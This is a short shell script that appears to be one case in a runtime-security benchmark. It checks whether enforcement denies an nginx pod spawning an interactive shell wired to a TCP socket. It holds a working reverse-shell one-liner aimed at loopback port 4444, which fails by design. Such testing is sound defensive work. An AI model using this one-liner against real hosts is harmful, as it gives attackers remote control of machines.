#!/usr/bin/env sh
# Tactic: Command and Control (TA0011)
# Technique: Command and Scripting Interpreter - Unix Shell (T1059.004)
# Attack: spawn an interactive shell wired to a TCP socket (reverse shell shape),
# using the loopback address so nothing leaves the pod. nginx never opens an
# interactive shell to a socket.
# Expected: under enforcement the unexpected exec and connect are both denied.
# Marker: outcome=attempted (the connect target is loopback:4444 with no
#         listener, so it fails regardless; judge blocking via tool logs).
set -u
TAG="02-reverse-shell"
KIND="attack"
rc=0
if command -v bash >/dev/null 2>&1; then
  timeout 3 bash -c 'sh -i >/dev/tcp/127.0.0.1/4444 0>&1' >/dev/null 2>&1 || rc=$?
else
  rc=127
fi
OUT="attempted"
printf 'BENCH_RESULT tag=%s kind=%s outcome=%s rc=%s\n' "$TAG" "$KIND" "$OUT" "$rc"
